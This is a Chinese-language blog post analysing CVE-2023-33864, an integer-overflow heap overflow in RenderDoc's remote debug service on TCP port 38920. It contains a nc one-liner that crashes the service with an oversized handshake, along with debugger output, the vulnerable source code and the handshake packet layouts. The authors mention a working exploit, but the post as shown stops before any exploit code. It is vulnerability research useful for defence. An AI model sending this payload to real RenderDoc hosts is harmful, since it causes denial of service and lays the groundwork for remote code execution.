---
layout: post
title:  "CVE-2023-33864 RenderDoc堆溢出漏洞分析"
date:   2025-05-27 13:27:38 +0800
category: userspace
---

RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。

# 漏洞信息

## 目标信息

CVE-2023-33864 是 renderdoc 软件的整数溢出导致的堆溢出漏洞，漏洞存在于1.27版本之前的renderdoc中，可以使攻击者绕过系统的地址随机化保护，实现远程任意代码执行。

RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。

RenderDoc 是CS架构，分为两部分，一部分是图形化的调试界面，作为client使用；另一部分是调试服务作为server端使用。

服务端以 librenderdoc.so 的形式向 client 提供调试服务。

client 既可以从本地加载 [libcrenderdoc.so](http://libcrenderdoc.so)，调用其中的API，进行本地调试；

client 又可以从远程通过 38920 tcp 端口连接到 [libcrenderdoc.so](http://libcrenderdoc.so) ，进行远程调试；

所以漏洞出现在 librenderdoc.so 的 TCP 服务部分。

[librenderdoc.so](http://librenderdoc.so) 在被 ld 链接器加载的过程中，会执行自身的初始化函数，在初始化的时候会起一个 TCP 监听端口 38920，接收远程的调试请求。

## 漏洞信息

[www.qualys.com](https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt)

漏洞存在的位置是renderdoc私有的远程调试协议，该协议基于TCP协议。

当client向server请求建立调试的过程中，client首先向server发送表明自身身份的标识“client name”，server在处理“client name”的时候发生了整数溢出，进而造成了堆溢出。

漏洞能力：

1. 任意长度的堆溢出；
2. 溢出内容攻击者完全可控；
3. 没有 NULL 字符截断；

漏洞技巧：

House-of-Muney-Heap-Exploitation

[munmap madness · Online tukan sanctuary](http://tukan.farm/2016/07/27/munmap-madness/)

## 我们的工作

该漏洞由 Qualys 团队发现，该团队提出了漏洞利用思路，但是没有公开漏洞利用代码。

我们开发出了漏洞EXP，该EXP可以实现稳定的利用，在 libc-2.31 环境下完成了测试。

# 环境搭建

源码下载：

```bash
$ git clone https://github.com/baldurk/renderdoc.git
$ cd renderdoc
$ git tag
$ git checkout v1.26
```

库文件安装：

```bash
$ sudo apt install libx11-6 libx11-dev libxcb1 libxcb1-dev \
    libxcb-keysyms1 libxcb-keysyms1-dev \    
    mesa-common-dev libgl1-mesa-dev \    
    libpcre3-dev qt5-qmake python3-dev 
```

源码编译：

```bash
$ cd renderdoc
$ cmake -DCMAKE_BUILD_TYPE=Debug -Bbuild -H.
$ make -C build
```

# 漏洞复现

## 开启librenderdoc服务

载入librenderdoc.so动态链接库并调用strace进行系统调用跟踪：

```bash
 test@530ebd686b7d:/test$ strace -f -o strace.out -E LD_PRELOAD=/your/real/path/librenderdoc.so sleep 600
```

- strace：Linux 系统调用追踪工具，用于监控进程与内核的交互（如文件操作、进程管理等）。
    - -f：追踪子进程（fork/clone 创建的进程）。
    - -o strace.out：将输出保存到文件 strace.out。
    - -E LD_PRELOAD=/your/real/path/librenderdoc.so：设置环境变量 LD_PRELOAD（仅对 strace 启动的进程生效）。
- sleep 600：被追踪的目标进程（休眠600秒）。

可以看到本地打开了38920监听端口，docker端地址为172.17.0.2，server的线程号为2991：

```bash
test@530ebd686b7d:/test$ netstat -ltup
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:38920           0.0.0.0:*               LISTEN      2811/sleep 
test@530ebd686b7d:$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fda0:123d:b02a::2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::fc90:fbff:fe2c:f71e  prefixlen 64  scopeid 0x20<link>
        ether fe:90:fb:2c:f7:1e  txqueuelen 0  (Ethernet)
        RX packets 7460  bytes 30911657 (30.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3399  bytes 201607 (201.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
test@530ebd686b7d:/test$ ps -eLf
UID          PID    PPID     LWP  C NLWP STIME TTY          TIME CMD
....
test        2989    2914    2989  0    2 09:09 pts/2    00:00:00 /usr/bin/sleep 6000
test        2989    2914    2991  0    2 09:09 pts/2    00:00:00 /usr/bin/sleep 6000
test        2992    2971    2992  0    1 09:09 pts/6    00:00:00 ps -eLf
```

载入librenderdoc.so动态链接库时会开启tcp服务端，监听38920端口。

## 宿主机模拟远程攻击

```bash
$ (
  printf '\2\0\0\0\0\0\0\0\1\0\0\0\x80\x00\xa0\x00%010485760x' 1;   # 第一部分：构造头部+填充数据
  sleep 3;                                                          # 延迟3秒
  printf '%0128x%04096x' 1 1                                        # 第二部分：附加填充数据
) | nc -nv 172.17.0.2 38920                                         # 发送到目标端口
```

可以看到docker端的服务已经被打崩：

![批注 2025-05-13 155029.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-13_155029.png)

检查strace的输出：

```bash
2847  recvfrom(5, "00000000000000000000000000000000"..., 128, 0, NULL, NULL) = 128
2847  fcntl(5, F_GETFL)                 = 0x2 (flags O_RDWR)
2847  fcntl(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
2847  setsockopt(5, SOL_SOCKET, SO_RCVTIMEO_OLD, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) = 0
2847  recvfrom(5, "00000000000000000000000000000000"..., 4284546928, 0, NULL, NULL) = 4096
2847  writev(2, [{iov_base="malloc(): corrupted top size", iov_len=28}, {iov_base="\n", iov_len=1}], 2) = 29
2847  mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f59a2e59000
2847  rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
2847  rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1], [], 8) = 0
2847  getpid()                          = 2846
2847  gettid()                          = 2847
2847  tgkill(2846, 2847, SIGABRT)       = 0
2847  rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
2847  --- SIGABRT {si_signo=SIGABRT, si_code=SI_TKILL, si_pid=2846, si_uid=1000} ---
2846  <... clock_nanosleep resumed> <unfinished ...>) = ?
2847  +++ killed by SIGABRT (core dumped) +++
2846  +++ killed by SIGABRT (core dumped) +++
```

漏洞现场：

```bash
$ pwndbg /usr/bin/sleep          # 先挂在sleep程序上面进行调试
pwndbg> set environment LD_PRELOAD /test/renderdoc/build/lib/librenderdoc.so # 手动加载库文件                                                                                                                                                                                                        
pwndbg> r 600   
Starting program: /usr/bin/sleep 600                                                                                                                                                                                                                                                
warning: Error disabling address space randomization: Operation not permitted                                                                                                                                                                                                       
warning: could not convert 'rb_root' from the host encoding (UTF-8) to UTF-32.                                                                                                                                                                                                      
This normally should not happen, please file a bug report.                                                                                                                                                                                                                          
[Thread debugging using libthread_db enabled]                                                                                                                                                                                                                                       
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                                                                                                                                                                                          
[New Thread 0x7f49e7890700 (LWP 2932)]      # librenderdoc.so起了tcp进程                                                                                                                                                                                                                                        
malloc(): corrupted top size 
Thread 2 "TargetControlSe" received signal SIGABRT, Aborted.                                                                                                                                                                                                                        
[Switching to Thread 0x7f49e7890700 (LWP 2932)]                                                                                                                                                                                                                                     
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50                                                                                                                                                                                                               
warning: 50     ../sysdeps/unix/sysv/linux/raise.c: No such file or directory                                                                                                                                                                                                       
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                                                                                                                                                                                    
_______________________________________________________________________________________________________________[ REGISTERS / show-flags off / show-compact-regs off ]_______________________________________________________________________________________________________________
 RAX  0
 RBX  0x7f49e7890700 __ 0x7f49e7890700
 RCX  0x7f49e7de500b (raise+203) __ mov rax, qword ptr [rsp + 0x108]
 RDX  0
 RDI  2
 RSI  0x7f49e788f450 __ 0
 R8   0
 R9   0x7f49e788f450 __ 0
 R10  8
 R11  0x246
 R12  0x7f49ed0a2000 __ 0x6c6c616d00001000
 R13  0x7f49e788f6c0 __ 0x7f49e788f6d0 __ 0x7f49e7f5929a __ 0x203a646d6372000a /* '\n' */
 R14  0x1000
 R15  1
 RBP  0x7f49e788f7a0 __ 0x1c
 RSP  0x7f49e788f450 __ 0
 RIP  0x7f49e7de500b (raise+203) __ mov rax, qword ptr [rsp + 0x108]
________________________________________________________________________________________________________________________[ DISASM / x86-64 / set emulate on ]________________________________________________________________________________________________________________________
 _ 0x7f49e7de500b <raise+203>    mov    rax, qword ptr [rsp + 0x108]     RAX, [0x7f49e788f558] => 0x3a9e059a88559600
   0x7f49e7de5013 <raise+211>    xor    rax, qword ptr fs:[0x28]         RAX => 0 (0x3a9e059a88559600 ^ 0x3a9e059a88559600)
   0x7f49e7de501c <raise+220>    jne    raise+260                   <raise+260>
  
   0x7f49e7de501e <raise+222>    mov    eax, r8d       EAX => 0
   0x7f49e7de5021 <raise+225>    add    rsp, 0x118     RSP => 0x7f49e788f568 (0x7f49e788f450 + 0x118)
   0x7f49e7de5028 <raise+232>    ret                                <abort+299>
    _
   0x7f49e7dc4859 <abort+299>    mov    rbx, qword ptr fs:[0x10]            RBX, [0x7f49e7890710] => 0x7f49e7890700 __ 0x7f49e7890700
   0x7f49e7dc4862 <abort+308>    cmp    qword ptr [rip + 0x1cb3ef], rbx     0x0 - 0x7f49e7890700     EFLAGS => 0x287 [ CF PF af zf SF IF df of ]
   0x7f49e7dc4869 <abort+315>    je     abort+379                   <abort+379>
  
   0x7f49e7dc486b <abort+317>    mov    eax, dword ptr fs:[0x18]            EAX, [0x7f49e7890718] => 1
   0x7f49e7dc4873 <abort+325>    test   eax, eax                            1 & 1     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
_____________________________________________________________________________________________________________________________________[ STACK ]______________________________________________________________________________________________________________________________________
00:0000_ rsi r9 rsp 0x7f49e788f450 __ 0
... _               7 skipped
___________________________________________________________________________________________________________________________________[ BACKTRACE ]____________________________________________________________________________________________________________________________________
 _ 0   0x7f49e7de500b raise+203
   1   0x7f49e7dc4859 abort+299
   2   0x7f49e7e2f266 __libc_message+662
   3   0x7f49e7e372fc None
   4   0x7f49e7e3a6ba _int_malloc+3146
   5   0x7f49e7e3c299 malloc+441
   6   0x7f49e7ad3b29 operator new(unsigned long)+25
   7   0x7f49e968d3ba StringFormat::sntimef(long, char const*)+133
_______________________________________________________________________________________________________________________________[ THREADS (2 TOTAL) ]________________________________________________________________________________________________________________________________
  _ 2   "TargetControlSe" stopped: 0x7f49e7de500b <raise+203> 
    1   "sleep"           stopped: 0x7f49e7e7f23f <clock_nanosleep+223> 
____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
pwndbg> bt
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007f49e7dc4859 in __GI_abort () at abort.c:79
#2  0x00007f49e7e2f266 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f49e7f59298 "%s\n") at ../sysdeps/posix/libc_fatal.c:156
#3  0x00007f49e7e372fc in malloc_printerr (str=str@entry=0x7f49e7f57569 "malloc(): corrupted top size") at malloc.c:5347
#4  0x00007f49e7e3a6ba in _int_malloc (av=av@entry=0x7f49e0000020, bytes=bytes@entry=28) at malloc.c:4107
#5  0x00007f49e7e3c299 in __GI___libc_malloc (bytes=28) at malloc.c:3066
#6  0x00007f49e7ad3b29 in operator new(unsigned long) () from /lib/x86_64-linux-gnu/libstdc++.so.6
#7  0x00007f49e968d3ba in StringFormat::sntimef (utcTime=1747123722, format=0x7f49e993c364 "[%H:%M:%S] ") at /test/renderdoc/renderdoc/os/posix/posix_stringio.cpp:610                                                
#8  0x00007f49e902535d in rdclog_direct (utcTime=1747123722, pid=2928, type=LogType::Comment, project=0x7f49e99486bf "RDOC", file=0x7f49e9948940 "/test/renderdoc/renderdoc/core/target_control.cpp", line=489, fmt=0x7f49e9948ae8 "Invalid/Unsupported handshake '%s' / %d")
    at /test/renderdoc/renderdoc/common/common.cpp:391
#9  0x00007f49e9143228 in RenderDoc::TargetControlServerThread (sock=0x56319210be70) at /test/renderdoc/renderdoc/core/target_control.cpp:489
#10 0x00007f49e9045ed1 in <lambda()>::operator()(void) const (__closure=0x7f49e788feb0) at /test/renderdoc/renderdoc/core/core.cpp:456
#11 0x00007f49e905081c in std::_Function_handler<void(), RenderDoc::Initialise()::<lambda()> >::_M_invoke(const std::_Any_data &) (__functor=...) at /usr/include/c++/9/bits/std_function.h:300
#12 0x00007f49e851ceec in std::function<void()>::operator() (this=0x7f49e788feb0) at /usr/include/c++/9/bits/std_function.h:688
#13 0x00007f49e968da8d in Threading::sThreadInit (init=0x56319210bf40) at /test/renderdoc/renderdoc/os/posix/posix_threading.cpp:173
#14 0x00007f49e7c13609 in start_thread (arg=<optimized out>) at pthread_create.c:477
#15 0x00007f49e7ec1353 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
```

栈回溯信息：

![批注 2025-05-13 161522.png](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-13_161522.png)

# 漏洞分析

## 漏洞原理

librenderdoc.so 初始化过程中会起一个 TCP 服务线程作为server，线程主体是TargetControlServerThread函数。该函数内部是一个 while 循环，每隔5秒钟检查一次是否有客户端连接到38920端口。

server 实例化一个 StreamReader 对象 ser 用于和 client 交互。ser对象里面封装了 client 的网络句柄、接收缓冲区、读写指针等。

从数据包解析 版本号、clientname、是否杀死已有的调试线程这3个信息。

成功解析以上3个信息之后，若当前 server 端没有调试线程，那么为 client 起一个新的调试线程；

若当前 server 端已经存在了调试线程，若 kick = true，为当前的 client 起一个新线程来代替旧线程。

若当前 server 端已经存在了调试线程，若 kick = false，那么继续保留旧线程，并且把就线程的名称返回给 client，告知 client 已有线程存在。

```cpp
void RenderDoc::TargetControlServerThread(Network::Socket *sock)
{
  Threading::SetCurrentThreadName("TargetControlServerThread");
  Threading::KeepModuleAlive();
  RenderDoc::Inst().m_SingleClientName = "";
  Threading::ThreadHandle clientThread = 0;
  RenderDoc::Inst().m_ControlClientThreadShutdown = false;
  while(!RenderDoc::Inst().m_TargetControlThreadShutdown)
  {
    Network::Socket *client = sock->AcceptClient(0);
    if(client == NULL)
    {
      if(!sock->Connected())
      {
        RDCERR("Error in accept - shutting down server");

        SAFE_DELETE(sock);
        Threading::ReleaseModuleExitThread();
        return;
      }

      Threading::Sleep(5);
      continue;
    }

    rdcstr existingClient;
    rdcstr newClient;
    uint32_t version;
    bool kick = false;

    // receive handshake from client and get its name
    {
      ReadSerialiser ser(new StreamReader(client, Ownership::Nothing), Ownership::Stream);
      PacketType type = ser.ReadChunk<PacketType>();

      if(type != ePacket_Handshake)
      {
        SAFE_DELETE(client);
        continue;
      }

      SERIALISE_ELEMENT(version);
      SERIALISE_ELEMENT(newClient);
      SERIALISE_ELEMENT(kick);

      ser.EndChunk();

      if(newClient.empty() || !IsProtocolVersionSupported(version))
      {
        RDCLOG("Invalid/Unsupported handshake '%s' / %d", newClient.c_str(), version);
        SAFE_DELETE(client);
        continue;
      }
    }

    // see if we have a client
    {
      SCOPED_LOCK(RenderDoc::Inst().m_SingleClientLock);
      existingClient = RenderDoc::Inst().m_SingleClientName;
    }

    if(!existingClient.empty() && kick)
    {
      // forcibly close communication thread which will kill the connection
      RenderDoc::Inst().m_ControlClientThreadShutdown = true;
      Threading::JoinThread(clientThread);
      Threading::CloseThread(clientThread);
      clientThread = 0;
      RenderDoc::Inst().m_ControlClientThreadShutdown = false;
      existingClient = "";
    }

    if(existingClient.empty())
    {
      SCOPED_LOCK(RenderDoc::Inst().m_SingleClientLock);
      RenderDoc::Inst().m_SingleClientName = newClient;
    }

    // if we've claimed client status, spawn a thread to communicate
    if(existingClient.empty() || kick)
    {
      clientThread =
          Threading::CreateThread([version, client] { TargetControlClientThread(version, client); });
      continue;
    }
    else
    {
      // if we've been asked to kick the existing connection off
      // reject this connection and tell them who is busy
      WriteSerialiser ser(new StreamWriter(client, Ownership::Nothing), Ownership::Stream);

      ser.SetStreamingMode(true);

      rdcstr target = RenderDoc::Inst().GetCurrentTarget();
      {
        SCOPED_SERIALISE_CHUNK(ePacket_Busy);
        SERIALISE_ELEMENT(TargetControlProtocolVersion);
        SERIALISE_ELEMENT(target);
        SERIALISE_ELEMENT(RenderDoc::Inst().m_SingleClientName);
      }

      // don't care about errors, we're going to close the connection either way
      SAFE_DELETE(client);
    }
  }
  RenderDoc::Inst().m_ControlClientThreadShutdown = true;
  // don't join, just close the thread, as we can't wait while in the middle of module unloading
  Threading::CloseThread(clientThread);
  clientThread = 0;

  SAFE_DELETE(sock);
  Threading::ReleaseModuleExitThread();
}
```

client向server请求建立调试的过程中，client首先向server发送握手包表明自身身份，其中包含了请求标识“client name”，server在处理“client name”的时候，首先实例化一个 StreamReader 对象用于网络通信，该对象内部有一个64KB的堆缓冲区m_BufferBase 用于暂存网络数据，m_InputSize 指示已经读取的字节数，m_BufferHead 指示下一次写入的位置，m_BufferSize 指示缓冲区的大小为64KB。

```c
// streamio.cpp

42 static const uint64_t initialBufferSize = 64 * 1024;
 ..
 92 StreamReader::StreamReader(Network::Socket *sock, Ownership own)
 93 {
 94   m_Sock = sock;
 95
 96   m_BufferSize = initialBufferSize;
 97   m_BufferBase = AllocAlignedBuffer(m_BufferSize);
 98   m_BufferHead = m_BufferBase;
 99
100   // for sockets we use m_InputSize to indicate how much data has been read into the buffer.
101   m_InputSize = 0;
```

SerialiseValue 函数用于解析握手包的字段，读取长度字段解析出 “client name”字符串的长度，调用resize函数分配 string buffer， 保存“client name”所需的堆块，然后从网络读取 “client name” 并保存。

```c
// D:\sourceinsight工程\renderdoc\renderdoc\renderdoc\serialise\serialiser.h

1307   void SerialiseValue(SDBasic type, size_t byteSize, rdcstr &el)
1308   {
1309     uint32_t len = 0;
1310
1311     if(IsReading())
1312     {
1313       m_Read->Read(len);
1314       el.resize((int)len);
1315       if(len > 0)
1316         m_Read->Read(&el[0], len);
```

若读取的数据长度超过10MB，那么进入ReadLargeBuffer函数，ReadLargeBuffer把数据直接拷贝进入string buffer。

若小于10MB，那么先从网络读取数据到m_BufferBase，再从m_BufferBase拷贝数据到string buffer。

```c
139   bool Read(void *data, uint64_t numBytes)
140   {
...
183         if(numBytes >= 10 * 1024 * 1024 && Available() + 128 < numBytes)
184         {
185           success = ReadLargeBuffer(data, numBytes);
```

若是读取大于10MB的数据，除了末尾的 128 字节，之前的部分被直接通过 socket 读取进入 string buffer，这个过程在函数 ReadFromExternal 里面。

末尾的128字节先通过 socket 读取到 m_BufferBase 里面，再从 m_BufferBase 拷贝到 string buffer。

```c
271 bool StreamReader::ReadLargeBuffer(void *buffer, uint64_t length)
272 {
...
275   byte *dest = (byte *)buffer;
...
297     uint64_t directReadLength = length - 128;
...
304       bool ret = ReadFromExternal(dest, directReadLength);
305
306       dest += directReadLength;
...
350   m_BufferHead = m_BufferBase + m_BufferSize;
...
354   bool ret = ReadFromExternal(m_BufferHead - 128, 128);
...
357   if(dest && ret)
358     memcpy(dest, m_BufferHead - 128, 128);
```

读取末尾128字节之前的内容进入到string buffer中，更新 m_InputSize 字段，完成了一个字段内容的读取。

在完整接收数据的前提下，为了尽可能地提高程序运行的效率，继续利用 string buffer 未使用的空间来保存下一次解析的内容。

计算 m_BufferBase 缓冲区有待接收的数据长度，利用 string buffer 继续保存。

漏洞点就在这里，因为 m_BufferSize = 64KB，m_InputSize是一个大于等于10MB的值，相减之后发生了整数溢出，bufSize 变成了一个极大的 uint32 类型的值，接下来就会往 string buffer里面写入任意长度的数据。

```c
366 bool StreamReader::ReadFromExternal(void *buffer, uint64_t length)
367 {
...
399       byte *readDest = (byte *)buffer;
400
401       success = m_Sock->RecvDataBlocking(readDest, (uint32_t)length);
402
403       if(success)
404       {
405         m_InputSize += length;
406         readDest += length;
407
408         uint32_t bufSize = uint32_t(m_BufferSize - m_InputSize);
...    // now read more, as much as possible, to try and batch future reads
411         success = m_Sock->RecvDataNonBlocking(readDest, bufSize);
```

那么在 ReadLargeBuffer 函数的354行，读取剩下的128字节进入m_BufferBase缓冲区的时候，同样也可以往 m_BufferBase 里面写入任意长度的数据，造成堆溢出。

```c
271 bool StreamReader::ReadLargeBuffer(void *buffer, uint64_t length)
272 {
...
275   byte *dest = (byte *)buffer;
...
297     uint64_t directReadLength = length - 128;
...
304       bool ret = ReadFromExternal(dest, directReadLength);
305
306       dest += directReadLength;
...
350   m_BufferHead = m_BufferBase + m_BufferSize;
...
354   bool ret = ReadFromExternal(m_BufferHead - 128, 128);
...
357   if(dest && ret)
358     memcpy(dest, m_BufferHead - 128, 128);
```

## 握手包的结构

renderdoc私有调试协议是作为TCP协议的载荷进行传输的。

exp用到了以下2种握手包

格式一：不包含 callstack 信息

```
 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x2  handshake flag                    |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x0                                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x9  version                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name length                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name                            |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        1 or 0 (kick or not)                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        padding bytes                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```

格式二：包含 callstack 信息

```
 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     0x2 ｜ 0x10000     handshake with callstack information   |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                callstack size （sizeof(unsigned long)）        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     callstack information                     |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x1 callstack num                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x9  version                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name length                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name                            |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        padding bytes                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          0x80 bytes                           |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      1 or 0 (kick or not)                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

## I/O 过程分析

### I/O相关的数据结构与算法

（这一块要讲，不然后面无法理解 exp 载荷部分为什么要那么写）

![renderdoc-第 4 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_4_%E9%A1%B5.jpg)

renderdoc 使用了高效的 TCP 通信方式，体现在如下两点：

- 维护了一个网络数据缓存，通过超量读取数据的方式缓存网络数据，减少了网络协议栈的开销;
- 接收超大数据（≥10MB）的时候不缓存，直接操作用户缓冲区，减少了数据的拷贝；

首先我们要知道 server 接收的数据放在哪里。

前面提到 server 实例化了 StreamReader 对象来进行网络通信，StreamReader 对象里面的m_BufferBase 成员指向了网络数据缓存，缓存的长度初始化为 64KB。

```cpp
// streamio.cpp

 42 static const uint64_t initialBufferSize = 64 * 1024;
 ..
 92 StreamReader::StreamReader(Network::Socket *sock, Ownership own)
 93 {
 94   m_Sock = sock;
 95
 96   m_BufferSize = initialBufferSize;
 97   m_BufferBase = AllocAlignedBuffer(m_BufferSize);
 98   m_BufferHead = m_BufferBase;
 99
100   // for sockets we use m_InputSize to indicate how much data has been read into the buffer.
101   m_InputSize = 0;
```

StreamReader 类里面网络 IO 相关的成员如下，其中公共成员 Read 函数用于从套接字接收数据，接收数据的长度 numBytes 由**调用者**保障，确保不发生缓冲区溢出，data 指向使用者的缓冲区。

StreamReader ::m_BufferBase 指针指网络数据缓存。

StreamReader::Read 函数从套接字接收数据先缓存到 m_BufferBase 里面，再根据使用者的需求拷贝 numBytes 个字节到参数 data 指向的用户缓冲区。

```cpp
class StreamReader
{
public:
	// 从套接字读取数据
	bool Read(void *data, uint64_t numBytes){ ...... }
	
private:
  // base of the buffer allocation, 指向网络缓冲区，长度64KB
  byte *m_BufferBase;

  // where we are currently reading from in the buffer, 网络缓冲区读指针
  byte *m_BufferHead;

  // the size of the buffer (just a window if reading from external source)
  uint64_t m_BufferSize;

  // the total size of the total input. This is how many bytes you can read, regardless
  // of how many bytes might actually be stored on the other side of the source (i.e.
  // this is the uncompressed output size)
  uint64_t m_InputSize;  // 从套接字已经读取的字节数

  // socket, if we're reading from a socket
  Network::Socket *m_Sock = NULL;   // 套接字封装

  // the offset in the file/decompressor that corresponds to the start of m_BufferBase
  uint64_t m_ReadOffset = 0;

};
```

StreamReader::Read 函数穿透到底层调用的是 ReadFromExternal 函数，buffer 参数通常是指向网络数据缓存 m_BufferBase，length 是期望接收到的数据长度，由调用者检查数据长度，避免缓冲区溢出。

ReadFromExternal 函数操作套接字接收网络数据，在调用过程中会发生 2 次数据接收：

第一轮接收数据在接收完 length 个字节的数据之前，线程会一直**阻塞**，确保length长度的数据完整接收，因为这 length 个字节数据是用户请求、并且当前还未接收的数据，是属于当前紧急处理的事项。

第二轮接收数据是**非阻塞**式的，在第一轮接收成功之后，在确保 m_BufferBase 缓冲区不溢出的情况下，尽可能多的接收数据，作用是为后续的用户请求缓存数据，避免重复传输，减小网络开销。

在 renderdoc 的客户端实现中，当一个数据包内容确定下来后，在 server 请求的数据之外也会尽可能多地传输下一阶段需要用到的数据。server 通过上述机制缓存多余的数据，等解析到那些字段的时候就不用再向 client 请求。

```c
366 bool StreamReader::ReadFromExternal(void *buffer, uint64_t length)
367 {
...
399       byte *readDest = (byte *)buffer;
400       // 阻塞式recv，确保全部读取了length个字节的数据
401       success = m_Sock->RecvDataBlocking(readDest, (uint32_t)length);
402
403       if(success)
404       {
405         m_InputSize += length;
406         readDest += length;
407
408         uint32_t bufSize = uint32_t(m_BufferSize - m_InputSize);
...    // now read more, as much as possible, to try and batch future reads
411         success = m_Sock->RecvDataNonBlocking(readDest, bufSize);
```

以上复杂的 I/O 流程需要一套读写指示器来管理缓冲区的内容，所以就需要用到 StreamReader 类的  3 个成员变量：m_BufferBase、m_BufferHead、m_InputSize

m_BufferBase 是网络数据缓存，初始长度为64KB；

m_BufferHead 是读指针，指向 m_BufferBase 中下一次读取的位置，其他地方要用数据就得从网络数据缓存里面读取，从哪里开始读取就通过 m_BufferHead 指示；

m_InputSize 记录当前从套接字读取的数据总量。

这三个成员的关系如下：

![renderdoc-第 2 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_2_%E9%A1%B5.jpg)

数据保存到 m_BufferBase 的时候累加 m_InputSize 。

```c
366 bool StreamReader::ReadFromExternal(void *buffer, uint64_t length)
367 {
...
399       byte *readDest = (byte *)buffer;
400       // 阻塞式recv，确保全部读取了length个字节的数据
401       success = m_Sock->RecvDataBlocking(readDest, (uint32_t)length);
402
403       if(success)
404       {
405         m_InputSize += length;
406         readDest += length;
407
408         uint32_t bufSize = uint32_t(m_BufferSize - m_InputSize);
...    // now read more, as much as possible, to try and batch future reads
411         success = m_Sock->RecvDataNonBlocking(readDest, bufSize);
```

![renderdoc-第 3 页.jpg](/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_3_%E9%A1%B5.jpg)

